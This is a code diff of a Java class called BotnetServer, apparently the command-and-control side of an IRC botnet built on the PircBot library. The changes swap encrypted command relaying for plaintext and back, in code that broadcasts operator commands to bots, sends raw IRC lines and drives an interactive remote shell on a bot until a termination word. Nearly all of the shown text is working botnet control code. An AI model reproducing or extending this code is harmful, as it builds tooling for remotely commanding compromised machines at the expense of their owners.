@@ -227,8 +227,8 @@ public class BotnetServer extends PircBot {
 				for (int i = 0; i < botNames.length; i++) {
 					if (!botNames[i].equals(NAME)) {
 						// TODO: encrypt command
-						//this.sendMessage(botNames[i], command);
-						this.sendMessage(botNames[i], masterMsgE.encryptMsg(command));
+						this.sendMessage(botNames[i], command);
+						//this.sendMessage(botNames[i], masterMsgE.encryptMsg(command));
 					}
 				}
 			}
@@ -263,20 +263,20 @@ public class BotnetServer extends PircBot {
 				}
 				for (int i = 0; i < bots.length; i++) {
 					// TODO: encrypt command
-					//sendMessage(bots[i], command);
-					sendMessage(bots[i], masterMsgE.encryptMsg(command));
+					sendMessage(bots[i], command);
+					//sendMessage(bots[i], masterMsgE.encryptMsg(command));
 				}
 			}
 		//Respond to a message beginning with a colon by messaging the CHANNEL
 		} else if (s.startsWith(":")) {
 			// TODO: encrypt s.substring
-			//sendMessage(CHANNEL, s.substring(1));
-			sendMessage(CHANNEL, masterMsgE.encryptMsg(s.substring(1)));
+			sendMessage(CHANNEL, s.substring(1));
+			//sendMessage(CHANNEL, masterMsgE.encryptMsg(s.substring(1)));
 		//Respond to all other messages by sending the message raw to the IRC server
 		} else if (!s.isEmpty()) {
 			// TODO: encrypt s
-			//sendRawLine(s);
-			sendRawLine(masterMsgE.encryptMsg(s));
+			sendRawLine(s);
+			//sendRawLine(masterMsgE.encryptMsg(s));
 		}
 	}
 	
@@ -357,30 +357,30 @@ public class BotnetServer extends PircBot {
 			
 			try {
 				// TODO: decrypt this
-				//System.out.print(shellout.nextLine());
-				String msg = shellout.nextLine();
-				System.out.println(msg);
-				System.out.println(masterMsgE.decryptMsg(msg));
+				System.out.print(shellout.nextLine());
+				//String msg = shellout.nextLine();
+				//System.out.println(msg);
+				//System.out.println(masterMsgE.decryptMsg(msg));
 				
 				String command = input.nextLine();
 				while (!command.equalsIgnoreCase(TERMINATION)) {
 					// TODO: make this encrypted
-					chat.sendLine(masterMsgE.encryptMsg(command)); // Made this encrypted
-					//chat.sendLine(command);
+					//chat.sendLine(masterMsgE.encryptMsg(command)); // Made this encrypted
+					chat.sendLine(command);
 					// TODO: decrypt this
-					//String response = shellout.nextLine();
-					String response = masterMsgE.decryptMsg(shellout.nextLine());
+					String response = shellout.nextLine();
+					//String response = masterMsgE.decryptMsg(shellout.nextLine());
 					while (!response.endsWith(SENTINEL)) {
 						System.out.println("\t" + response);
 						// TODO: decrypt this
-						//response = shellout.nextLine();
-						response = masterMsgE.decryptMsg(shellout.nextLine());
+						response = shellout.nextLine();
+						//response = masterMsgE.decryptMsg(shellout.nextLine());
 					}
 					System.out.print(response);
 					command = input.nextLine();
 				}
-				//chat.sendLine(command);
-				chat.sendLine(masterMsgE.encryptMsg(command));
+				chat.sendLine(command);
+				//chat.sendLine(masterMsgE.encryptMsg(command));
 			} catch (Exception e) {
 				e.printStackTrace();
 			}
